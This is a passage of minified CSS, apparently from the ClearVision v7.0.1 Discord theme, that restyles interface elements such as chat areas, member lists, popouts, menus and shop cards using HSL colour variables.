.footerContent__083ae{background:none}.visual-refresh .tile__72090{background:var(--hsl-card-shading);border:none}.visual-refresh .tile__72090:hover{background:var(--hsl-card-shading)}.visual-refresh .wrapperAudio_cf09d8{background:var(--hsl-card-shading);border:none}.visual-refresh .audioControls_cf09d8{background:rgba(0,0,0,0)}.visual-refresh .wrapper_cf09d8{background:var(--hsl-card-shading)}.visual-refresh .textContainer__4d95d,.visual-refresh .footer__4d95d{background:var(--hsl-card-shading);border:none}.visual-refresh .languageSelector__4d95d{background:var(--hsl-popout-shading)}.visual-refresh .modalTextContainer__4d95d{background:rgba(0,0,0,0);border:none}.visual-refresh .cozy_c19a55.hasThread_c19a55::after{border-color:var(--hsl-main-color)}.visual-refresh .container__9271d{border-color:var(--hsl-main-color)}.visual-refresh .container__9271d{background:var(--hsl-card-shading);border:none}.visual-refresh .cta__9271d{color:var(--hsl-main-color)}.visual-refresh .container_a8e786{background:var(--hsl-card-shading);border:none}.visual-refresh .container_f69538,.visual-refresh .container__0be77{background:var(--hsl-card-shading);border:none}.ripple_a8e786{background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .container_a8e786:not(.playing_a8e786) .playButtonContainer_a8e786{background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .container_a8e786:not(.playing_a8e786) .playButtonContainer_a8e786:is(:hover,:active){background:var(--hsl-hover-color)}.playing_a8e786 .playIcon_a8e786{color:var(--hsl-main-color)}.embedCard__44492,.footerContainer__44492{background:var(--hsl-card-shading)}.dot__44492{background:rgba(0,0,0,0)}.hoverButtonGroup__06ab4{background:var(--hsl-popout-shading)}.hoverButton__06ab4.selected__06ab4,.hoverButton__06ab4:hover{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container_f369db{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3))}.visual-refresh .header_f369db{background:var(--hsl-input-shading);border:2px solid var(--hsl-input-border-shading)}.visual-refresh .header_f369db .input__0f084{background:none;box-shadow:none}.visual-refresh .visual-refresh .headerWithMatchingPosts_f369db{border-bottom:none;border-color:var(--hsl-main-color)}.visual-refresh .visual-refresh .matchingPostsRow_f369db{background:var(--hsl-input-shading);border:2px solid var(--hsl-input-border-shading);border-top:1px solid var(--border-subtle)}.visual-refresh .container_ca49a1{background:var(--hsl-card-shading);border:none}.visual-refresh .descriptionContainer_ca49a1,.visual-refresh .gradient_ca49a1,.visual-refresh .linkContainer_ca49a1{background:rgba(0,0,0,0)}.visual-refresh .pill_a2c9e8{background:var(--hsl-card-shading);border-color:var(--hsl-main-color);transition:all .2s ease}.visual-refresh .pill_a2c9e8.clickable_a2c9e8:not(.disabled_a2c9e8):hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.visual-refresh .pill_a2c9e8.selected_a2c9e8{background:var(--hsl-main-color);border-color:var(--hsl-main-color);color:var(--interactive-active)}.visual-refresh .pill_a2c9e8.selected_a2c9e8:not(.disabled_a2c9e8):hover{background:var(--hsl-hover-color);border-color:var(--hsl-hover-color)}.visual-refresh .pill_a2c9e8 .container_f8b2d2{background:rgba(0,0,0,0);border:none}.visual-refresh .newPostsButton_f369db{background:var(--hsl-popout-shading);border-color:rgba(0,0,0,0)}.visual-refresh :is(.container__9a337,.container_faa96b){background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh :is(.container__9a337,.container_faa96b):hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.visual-refresh :is(.container__9a337,.container_faa96b):is(.isOpen__9a337,.isOpen_faa96b){background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.contentPreview__9a337{background:var(--hsl-card-shading);border:none}.pinIcon__08166{background:var(--hsl-main-color)}.visual-refresh .divider_ee23ac{background:rgba(0,0,0,0)}.visual-refresh .iconWrapper__7e6bb{background:var(--hsl-main-color)}.visual-refresh .icon__7e6bb path{fill:var(--header-primary)}.visual-refresh .container__34c2c{background:rgba(0,0,0,0);border:none}.visual-refresh .active__34c2c{color:var(--hsl-main-color)}.container__93db4{background:rgba(0,0,0,0)}.icon__93db4{background:var(--hsl-main-color);color:var(--header-primary)}.cta__93db4{color:var(--hsl-main-color)}.cta__93db4:hover{color:var(--hsl-hover-color)}.loadingCard_f369db{background:var(--hsl-card-shading);animation:cv-card-loading 1.5s infinite ease-in-out}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .resizeHandle__01ae2{background:rgba(0,0,0,0)}.visual-refresh .container__01ae2{background:rgba(0,0,0,0);border:none;border-bottom-left-radius:0}.visual-refresh .container__01ae2.floating__01ae2{background:var(--hsl-popout-shading)}.visual-refresh .container_fb64c9{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5))}.visual-refresh .channelTextArea_fb64c9{margin-bottom:0}.visual-refresh .channelTextAreaInner_fb64c9{background-color:var(--hsl-input-shading);box-shadow:0 0 2px 2px var(--hsl-input-border-shading);border-radius:8px}.visual-refresh .channelTextAreaInner_fb64c9:focus-within{box-shadow:0 0 2px 2px var(--hsl-main-color)}.iconWrapper__54b20{background:var(--hsl-main-color)}.icon__54b20 path{fill:var(--header-primary)}.chatHeaderBar_a5700d{background-color:var(--hsl-popout-shading)}.container_a8217b,.header_a8217b{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .newMessagesBar__0f481{top:4px;right:8px;background:hsl(from var(--hsl-main-color) h s l/0.9);border-radius:4px;transition:all .1s ease-in-out}.visual-refresh .newMessagesBar__0f481:active{padding-top:0;scale:.99}.visual-refresh .jumpToPresentBar__0f481{background:var(--hsl-popout-shading);border:none;border-radius:5px}.visual-refresh .messagesErrorBar__0f481{background:var(--hsl-danger-color);border:none;border-radius:5px}.visual-refresh .wrapper__44df5{background:var(--hsl-popout-shading);border:none}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .reactions__23977{border-radius:4px}.visual-refresh .reactions__23977 .reactionMe__23977{background:hsl(from var(--hsl-main-color) h s l/0.15);border-color:var(--hsl-main-color)}.visual-refresh .reactions__23977 .reactionMe__23977 .reactionCount__23977{color:var(--interactive-active)}.visual-refresh :is(.reaction__23977,.reactionBtn__23977):hover{border:1px solid var(--hsl-hover-color)}.reactionTooltip_b49891{background:var(--hsl-popout-shading)}:is(.theme-light,.theme-dark) .reactionEmojiDetailsClickable_d5cd2d{background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .reactionEmojiDetailsClickable_d5cd2d:hover{background:var(--hsl-hover-color)}.burstGlow__23977{border-radius:4px}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .searchResultsWrap_a9e706{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3));border:none}.visual-refresh .searchHeader_f3b986{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .searchResult__02a39{background:var(--hsl-card-shading);border:none}.visual-refresh .button__02a39{background:var(--hsl-main-color)}.visual-refresh .button__02a39:hover{background:var(--hsl-hover-color);color:var(--interactive-active)}/*! ClearVision v7.0.1 by ClearVision Team */:is(.theme-dark,.theme-light) .themed__9293f{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5))}:is(.theme-dark,.theme-light) .dot__9293f{display:none}.children__9293f::after{display:none}.akaBadge__488b1{background:var(--hsl-main-color)}.visual-refresh .searchBar__97492{background-color:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.visual-refresh .searchBar__97492:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.visual-refresh .searchFilter_bd8186,.visual-refresh .searchAnswer_bd8186{background:var(--hsl-main-color)}.visual-refresh .searchFilter_bd8186{border-top-right-radius:0;border-bottom-right-radius:0}.visual-refresh .searchAnswer_bd8186{border-top-left-radius:0;border-bottom-left-radius:0}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container_c8ffbb{background:none;border:none}.visual-refresh .membersWrap_c8ffbb{background:none;border:none;height:100%}.members_c8ffbb{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3))}.mulitplePlaceholderUsername__27cc6,.placeholderAvatar__27cc6,.placeholderUsername__27cc6{background:var(--hsl-card-shading)}.membersGroup_c8ffbb{display:flex;color:var(--hsl-main-color);font-weight:700;align-items:center}.membersGroup_c8ffbb:before{content:"""";height:2px;flex-grow:1;background:linear-gradient(to left, currentColor 50%, transparent);margin-right:5px}.membersGroup_c8ffbb:after{content:"""";height:2px;flex-grow:1;background:linear-gradient(to right, currentColor 50%, transparent);margin-left:5px}.visual-refresh .container__0f2e8{background:var(--hsl-card-shading);border-radius:8px;border-width:2px;padding-left:10px}.selected__0f2e8,.selected__0f2e8:hover{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.popoutContentWrapper_af3b89,.interactionsContainer_af3b89{background:var(--hsl-popout-shading)}.interactionsContainerHeader_af3b89{border:none}.member__5d473{background:rgba(0,0,0,0);backface-visibility:hidden}.memberInner__5d473{position:relative;width:100%;transition:all .15s ease-in-out,transform .1s ease-in-out;z-index:1}.memberInner__5d473:active{transform:scale(0.9)}.name__91a9d{width:-moz-fit-content;width:fit-content}.member__5d473 .nameContainer__703b9{position:static;transition:all .15s ease-in-out;z-index:unset}.member__5d473 .nameContainer__703b9:before{content:"""";position:absolute;top:0;right:0;bottom:0;left:0;background:linear-gradient(to right, var(--background-modifier-accent) 90%, transparent);border-radius:3px;opacity:0;transition:all .15s ease-in-out;z-index:-1}.member__5d473 .nameContainer__703b9:after{content:"""";position:absolute;top:0;right:100%;bottom:0;left:0;background:linear-gradient(to right, var(--hsl-main-color) 90%, transparent);border-radius:3px;opacity:.8;transition:all .3s ease-in-out;z-index:-1}.member__5d473 .nameContainer__703b9[style^=""color:""]:before,.member__5d473 .nameContainer__703b9[style^=""color:""]:after{background:linear-gradient(to right, currentColor 90%, transparent)}.nameplated__91a9d .member__5d473 .nameContainer__703b9[style^=""color:""]:before,.nameplated__91a9d .member__5d473 .nameContainer__703b9[style^=""color:""]:after{background:linear-gradient(to right, currentColor, transparent)}.truncated_c9d15c{color:var(--text-muted);transition:all .15s ease-in-out}.truncated_c9d15c strong{color:var(--hsl-main-color);font-weight:700;transition:all .15s ease-in-out}.member__5d473:hover .childContainer__91a9d{background:rgba(0,0,0,0)}.member__5d473:hover .nameContainer__703b9:before{opacity:1}.member__5d473:hover .nameContainer__703b9[style^=""color:""]:before{opacity:.07}.selected__91a9d .childContainer__91a9d{background-color:rgba(0,0,0,0)}.selected__91a9d .nameContainer__703b9{-webkit-text-fill-color:var(--interactive-active);text-shadow:0 0 3px rgba(0,0,0,.7)}.selected__91a9d .nameContainer__703b9:after{right:0}.selected__91a9d .truncated_c9d15c,.selected__91a9d strong{color:var(--interactive-active);text-shadow:0 0 3px rgba(0,0,0,.7)}.selected__91a9d .ownerIcon__5d473{filter:drop-shadow(0 0 3px rgba(0, 0, 0, 0.7))}.container__4413f{background:var(--hsl-popout-shading)}.ctaButton__4413f{background:var(--hsl-main-color);border:none}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .root__49fc1{background:var(--hsl-modal-shading);border:none;box-shadow:none}.header__49fc1,.content__49fc1,.footer__49fc1{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.container_eb2cd2{border:2px solid rgba(0,0,0,0);background:var(--background-modifier-accent)}.container_eb2cd2:hover{border-color:var(--hsl-hover-color)}.iconContainer__98cf7 circle{fill:var(--hsl-main-color)}.rowContainer__991a0{border:2px solid rgba(0,0,0,0);background:var(--background-modifier-accent)}.rowContainer__991a0:hover{border-color:var(--hsl-hover-color);background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.keyboardShortcutsModal_f061f6,.keybindGroup_f061f6{background:var(--hsl-modal-shading)}.combo_fcddc1 .key_fcddc1{border-color:var(--hsl-hover-color);box-shadow:inset 0 -4px var(--hsl-hover-color)}.combo_fcddc1 .key_fcddc1:active{border-color:var(--hsl-main-color);box-shadow:inset 0 -2px var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .quickswitcher_ac6cb0{background:var(--hsl-popout-shading);border:none;background:var(--hsl-input-shading)}.visual-refresh .scroller_ac6cb0{background:rgba(0,0,0,0)}.visual-refresh .input_ac6cb0{border:2px solid var(--hsl-input-border-shading)}.visual-refresh .input_ac6cb0:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.scroller_ac6cb0::-webkit-scrollbar{width:10px}.scroller_ac6cb0::-webkit-scrollbar-track{background:rgba(0,0,0,0) !important}.result__71961[aria-selected=true]{background:var(--hsl-hover-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(.scroller_cc2dff,.reactors_cc2dff){background:rgba(0,0,0,0)}.visual-refresh .reactionSelected_cc2dff{border:1px solid var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.pillContainer__9e06a{background:var(--background-modifier-accent)}.pillItemSelected__9e06a{background:var(--hsl-main-color)}.source_febe19:hover:not(.selectedSource_febe1) .sourcePreviewContainer_febe19:before{border-color:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.spinner_ca0af2{background:rgba(0,0,0,0)}.customGiftBoxHighlighted_d50aac{border-color:var(--hsl-main-color)}.iconBackground__33980{background:var(--hsl-main-color);color:var(--header-primary)}.visual-refresh .selectionBox_b13085{background:var(--background-modifier-accent);outline:none}.visual-refresh .selectedPlan_b13085{background:var(--background-modifier-accent);outline:2px solid var(--hsl-main-color)}.visual-refresh .previewContainerSelected__50f14{background:var(--background-modifier-accent);outline:2px solid var(--hsl-main-color);border:none}.customGiftMessage_bf1b4a{background:rgba(0,0,0,0)}.wrapper__4106a{background:rgba(0,0,0,0)}.cardInput__8b579{background-color:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.cardInputFocused__8b579{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.content_a8c622,.upsellFooter__5e07c{background:rgba(0,0,0,0)}:is(.theme-light,.theme-dark) .iconWrapper__96f95{background:var(--background-modifier-accent)}.value__96f95,.value__96f95:focus{box-shadow:none}/*! ClearVision v7.0.1 by ClearVision Team */.uploadDropModal_dbca3c .bgScale_dbca3c{background:var(--hsl-main-color)}.uploadDropModal_dbca3c .inner_dbca3c{border-color:var(--header-primary)}/*! ClearVision v7.0.1 by ClearVision Team */.selectorButton__0907c{background:var(--background-modifier-accent)}:is(.theme-light,.theme-dark) .item__3d4a0{border-color:var(--hsl-main-color)}.selectorButtonSelected__0907c{background:var(--hsl-main-color)}.visual-refresh .radioItemStyles__837b7{background:rgba(0,0,0,0)}.visual-refresh .banReasonOtherClickable__837b7{background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .modal__9a792{background:var(--hsl-modal-shading) !important}.visual-refresh .browser__9a792{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.pillIconOnline__921c5{background:var(--hsl-online-color)}.visual-refresh .editProfileContainer__42179{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(.actionButtons_cc1819,.closeButton__6088c){background:var(--hsl-modal-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.scroller__6fd0e{background:rgba(0,0,0,0)}.headerWave__1dfae{background:rgba(0,0,0,0);color:rgba(0,0,0,0)}.bodyWave__1dfae{display:none}.topPerksCard__3add8,.card__4d7bb,.wrapper__5b98e{background:var(--hsl-card-shading)}.innerWrapper_b4589b{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .header__0b563{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5)) !important}.visual-refresh .container__0b563{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4)) !important}.visual-refresh .pageBody__41ed7{background:rgba(0,0,0,0)}.visual-refresh .container_bc0d35{background:var(--hsl-card-shading)}.visual-refresh .container_bc0d35.adminUpsell_bc0d35{background:var(--hsl-main-color)}.visual-refresh .channelRow_e4503a{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0);margin-bottom:8px;border-radius:8px}.visual-refresh .channelRow_e4503a:hover:not(.disabled_e4503a){background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.visual-refresh .prompt__5d7c9{background:rgba(0,0,0,0);border:none}.visual-refresh .optionButtonWrapper__270d7{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh .optionButtonWrapper__270d7:hover{background:var(--hsl-card-shading)}.visual-refresh .optionButtonWrapper__270d7.selected__270d7{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.checkIcon__270d7{background:var(--hsl-main-color)}.profileCard__5d7c9{background:var(--hsl-card-shading)}.role__5d7c9{background:rgba(0,0,0,0);position:relative}.roleDot__5d7c9::before{content:"""";top:-1px;right:-1px;bottom:-1px;left:-1px;position:absolute;background:inherit;opacity:.2;border-radius:4px}.emptyPage__5d7c9{background-color:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container__551b0{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2))}.visual-refresh .navItem__551b0{position:relative;z-index:1}.visual-refresh .navItem__551b0:after{content:"""";position:absolute;top:0;right:100%;bottom:0;left:0;transition:all .3s ease-in-out;z-index:-1;border-radius:4px}.visual-refresh .navItem__551b0.selected__551b0{background:rgba(0,0,0,0)}.visual-refresh .navItem__551b0.selected__551b0:after{right:0;background:var(--hsl-main-color);animation:cv-channel-select .3s ease-in-out}.backdrop__8a7fc{background:var(--hsl-popout-shading)}.relative__8a7fc{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5))}.iconButton__8a7fc{background:var(--hsl-main-color)}.iconButton__8a7fc:hover{background:var(--hsl-hover-color)}.visual-refresh .container_a592e1{border:none}.visual-refresh .scroller__23746{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh:is(.theme-dark,.theme-light) .card__84e3e{background:var(--hsl-card-shading);border:none}.visual-refresh:is(.theme-dark,.theme-light) .card__84e3e:hover{background:var(--hsl-card-shading);box-shadow:0 0 0 2px var(--hsl-hover-color)}.visual-refresh .avatar_f215b9{background:var(--hsl-card-shading);border:none}.visual-refresh .card_f215b9:hover .avatar_f215b9{background:var(--hsl-card-shading)}.container__19cf2,.container__5682d{background:var(--hsl-card-shading)}.visual-refresh:is(.theme-light,.theme-dark) .iconMask__4cb8a{background:var(--hsl-card-shading);width:48px;height:48px;padding:0;margin-left:8px}.visual-refresh .card__4cb8a:hover .iconMask__4cb8a{background:var(--hsl-card-shading)}.presenceCountDot__4cb8a{background:var(--hsl-online-color)}.container_cbd375{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .container_cec934{background:var(--hsl-card-shading)}.visual-refresh .container__956c6{background:rgba(0,0,0,0)}.visual-refresh .modalBg_de2fa0{background:var(--hsl-modal-shading)}.visual-refresh .modalContent_de2fa0,.visual-refresh .contentHeader_de2fa0{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container__133bf{background:none;border:none}.visual-refresh .tabBody__133bf{background:none}.visual-refresh .peopleColumn__133bf{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.blockedIgnoredSettingsNotice__6811a{border:1px solid var(--hsl-main-color);background-color:var(--hsl-card-shading)}.actionButton_f8fa06{background-color:var(--hsl-card-shading)}.actionButton_f8fa06.highlight_f8fa06{background-color:var(--hsl-card-shading);color:var(--interactive-active)}.actionButton_f8fa06:hover{background:var(--hsl-hover-color)}.actionButton_f8fa06.actionAccept_f8fa06{color:var(--hsl-success-color)}.actionButton_f8fa06.actionAccept_f8fa06:hover{background:var(--hsl-success-color);color:var(--interactive-active)}.actionButton_f8fa06.actionDeny_f8fa06{color:var(--hsl-danger-color)}.actionButton_f8fa06.actionDeny_f8fa06:hover{background:var(--hsl-danger-color);color:var(--interactive-active)}.visual-refresh .searchBar__5ec2f{border-width:2px}.visual-refresh .tabBar__133bf .addFriend__133bf.addFriend__133bf.addFriend__133bf{background-color:rgba(0,0,0,0);color:var(--text-secondary);border:none}.visual-refresh .tabBar__133bf .addFriend__133bf.addFriend__133bf.addFriend__133bf:hover{background-color:var(--background-modifier-accent)}.visual-refresh .tabBar__133bf .addFriend__133bf.addFriend__133bf.addFriend__133bf[aria-selected=true]{background-color:var(--hsl-main-color);color:var(--text-primary)}.addFriendInputWrapper__72ba7{background:var(--hsl-input-shading);border:2px solid var(--hsl-input-border-shading)}.addFriendInputWrapper__72ba7:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.input__72ba7{background:rgba(0,0,0,0);box-shadow:none}.nowPlayingColumn__133bf{background:none}.container__7d20c{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2))}.visual-refresh .scroller__7d20c{border:none}.visual-refresh .outer_bf1984,.visual-refresh .outer_bf1984:is(.interactive_bf1984:hover,.active_bf1984){background-color:var(--hsl-card-shading);border:none}.visual-refresh .section__00943{border:none}.emptyCard__7e549{background-color:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .page_c791b2{background:rgba(0,0,0,0) !important}.visual-refresh .mainTableContainer__09a38{background:var(--hsl-card-shading);border:none}.newMembersNotice_acdcc0{background:var(--hsl-main-color)}.newMembersNotice_acdcc0:hover{background:var(--hsl-hover-color)}.otherRoles__71c22{background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.list_f391e3{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}/*! ClearVision v7.0.1 by ClearVision Team */.applicationStore_f07d62{background:rgba(0,0,0,0)}.visual-refresh .homeWrapper__0920e{background:rgba(0,0,0,0);border:none}.mainPageScroller_ca1a02,.allPerksScroller_ca1a02{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.mainPageScroller_ca1a02{right:0;transition:all .75s ease-in-out}.mainPageScroller_ca1a02:has(+.open_ca1a02){right:100%}.card_f8e6bf,.container_da4aee{background:var(--hsl-card-shading)}:is(.images-light,.images-dark) .textContainer_da4aee{background:none}.giftCardButton_da4aee{background:rgba(0,0,0,0)}.cardDescription_f8e6bf{background:var(--hsl-popout-shading)}.seeAllPerksButton_ca1a02{background:var(--hsl-card-shading);border:none}.backButton_b9abc5{background:var(--hsl-main-color)}.backButton_b9abc5:hover{background:var(--hsl-hover-color)}:is(.theme-dark,.theme-light) :is(.leftArrow__3cf14,.rightArrow__3cf14){background:var(--hsl-card-shading)}:is(.theme-dark,.theme-light) :is(.leftArrow__3cf14,.rightArrow__3cf14):hover{background:var(--hsl-hover-color)}:is(.theme-dark,.theme-light) .inactiveArrow__3cf14{background:var(--hsl-card-shading)}.cardProgressBar__3cf14{background:var(--hsl-card-shading)}.selectedDot__3cf14{background:var(--hsl-main-color)}.innerWrapper_c511e4{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.background__7449f :is(.scrollerBase__99f8c,.scrollerBase_d125d2){background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .row_d13feb{background:var(--hsl-card-shading);border:var(--hsl-card-shading)}.headerIcon__553a5{background-color:var(--hsl-card-shading);border-color:rgba(0,0,0,0)}.container__86ab2{background:var(--hsl-popout-shading);border:none}.avatarWrapper__86ab2{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.shopScroll__6db1d,.pageWrapper__6db1d{background:rgba(0,0,0,0)}.visual-refresh .shop__6db1d{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .shop__08415{background:rgba(0,0,0,0)}.visual-refresh .shopCard_c3d04b{background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh .shopCard_c3d04b:hover{border-color:var(--hsl-main-color)}.visual-refresh .cardText_c3d04b{background:rgba(0,0,0,0);border:none}.visual-refresh .skeleton__72fa0,.skeleton__08415{background:var(--hsl-card-shading-inverted)}.cardBody__72fa0,.skeletonBody__08415{background:var(--hsl-card-shading-inverted)}:is(.cardAvatar__72fa0,.cardTitle__72fa0,.cardDescription__72fa0,.cardSummary__72fa0){background:rgba(0,0,0,0)}.collectibleInfoContainer_c50f62{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .scroller__4a84a,.visual-refresh .scroller_fb04e1{background:var(--hsl-card-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .wrapper__4e6ce{background:rgba(0,0,0,0)}.loadingPopout__58f1c{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.autocomplete__13533{background:var(--hsl-popout-shading);box-shadow:none}.clickable__13533[aria-disabled=false] .base__13533:hover{background:var(--hsl-hover-color)}.clickable__13533[aria-selected=true] .base__13533{background:var(--hsl-hover-color)}.contentTitle__13533{padding:4px 8px;color:var(--header-primary)}.visual-refresh .wrapper_b1e4f3{background:rgba(0,0,0,0)}.selected__1a58a,.selected__1a58a:hover{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.lookFilled__3f413.select__3f413{box-shadow:none}.lookFilled__3f413.select__3f413:hover{border:1px solid var(--input-border)}.popout__3f413,.popout__3f413.popoutPositionTop__3f413{background:var(--hsl-popout-shading);border:none}.option__3f413{border-radius:8px;margin:0 8px}.option__3f413:hover{background:var(--hsl-hover-color)}.option__3f413[aria-selected=true]{background:var(--hsl-main-color)}.option__3f413[aria-selected=true]:not(.option__3f413.multi__3f413){background:var(--hsl-main-color)}.selectedIcon__3f413{color:var(--interactive-active)}.selectedIcon__3f413 circle{fill:var(--hsl-main-color)}.multiSelectCheckbox__3f413.checked__3f413{background:var(--interactive-active)}.multiSelectCheckbox__3f413.checked__3f413 path{fill:var(--hsl-main-color)}.optionPillItem__3f413 .optionPillBtn__3f413{background:rgba(0,0,0,0);border:none}.optionPillItem__3f413 .optionPillBtn__3f413 .optionPillBtn__3f413{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .recentMentionsPopout__95796{background:var(--hsl-popout-shading);box-shadow:none}.visual-refresh .header_ab6641{background:rgba(0,0,0,0)}.visual-refresh .channelHeader__35a7e{background:hsl(from var(--hsl-main-color) h s l/0.8);padding-left:20px;padding-right:6px;border-radius:8px}.visual-refresh .guildIcon__35a7e{background-color:var(--hsl-card-shading)}.visual-refresh .button__06eda{background:var(--hsl-card-shading)}.visual-refresh .icon_d404a3{background:var(--hsl-main-color);color:var(--header-primary)}.visual-refresh .container__0f711{background:rgba(0,0,0,0)}.visual-refresh .maskBackground_db811b{background:var(--hsl-main-color) !important}.visual-refresh .tutorial__2692d{background:var(--hsl-card-shading)}.visual-refresh .tutorialIcon__2692d{background:var(--hsl-main-color);color:var(--interactive-active)}.visual-refresh .messages__1ccd1{background:var(--hsl-card-shading);border:none}.visual-refresh .collapseButton__427f0{left:0}.visual-refresh .container__95796{margin-left:16px}.visual-refresh .messageContainer__95796{background:var(--hsl-card-shading);border:none;margin:0}/*! ClearVision v7.0.1 by ClearVision Team */.menu_c1e9c4{background:var(--hsl-popout-shading);border:none;border-radius:5px}.colorDefault_c1e9c4.focused_c1e9c4{background-color:var(--hsl-hover-color)}.colorDefault_c1e9c4:active:not(.hideInteraction_c1e9c4){background-color:var(--hsl-main-color)}.colorDanger_c1e9c4.focused_c1e9c4{background-color:var(--hsl-danger-color)}.colorDanger_c1e9c4.focused_c1e9c4:not(.checkboxContainer_c1e9c4) path{fill:var(--interactive-active)}.colorDanger_c1e9c4:active:not(.hideInteraction_c1e9c4){background-color:hsl(from var(--hsl-danger-color) h s l/0.8);color:var(--interactive-active)}.colorDanger_c1e9c4:active:not(.hideInteraction_c1e9c4) .label_c1e9c4{color:var(--interactive-active)}.item_c1e9c4.focused_c1e9c4 .label_c1e9c4{color:var(--header-primary)}.status_a423bd[style*=""rgb(130, 131, 139)""]{background-color:var(--hsl-offline-color) !important}.status_a423bd[style*=""rgb(67, 162, 90)""]{background-color:var(--hsl-online-color) !important}.status_a423bd[style*=""rgb(202, 150, 84)""]{background-color:var(--hsl-idle-color) !important}.status_a423bd[style*=""rgb(216, 58, 66)""]{background-color:var(--hsl-dnd-color) !important}.focused_c1e9c4#set-status-submenu-online{background-color:var(--hsl-online-color)}.focused_c1e9c4#set-status-submenu-idle{background-color:var(--hsl-idle-color)}.focused_c1e9c4#set-status-submenu-dnd{background-color:var(--hsl-dnd-color)}.focused_c1e9c4#set-status-submenu-invisible{background-color:var(--hsl-offline-color)}.activeIcon_d40c56 path{fill:var(--hsl-main-color)}.focused_d40c56 .activeIcon_d40c56 circle{fill:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.tooltipPrimary__382e7{background-color:var(--hsl-popout-shading);border:none}.tooltipPrimary__382e7 .tooltipPointer__382e7{border-top-color:var(--hsl-popout-shading)}.tooltipPrimary__382e7 .tooltipPointer__382e7::before,.tooltipPrimary__382e7 .tooltipPointer__382e7::after{display:none}.tooltipBrand__382e7{background-color:var(--hsl-main-color);border:none}.tooltipBrand__382e7 .tooltipPointer__382e7{border-top-color:var(--hsl-main-color)}/*! ClearVision v7.0.1 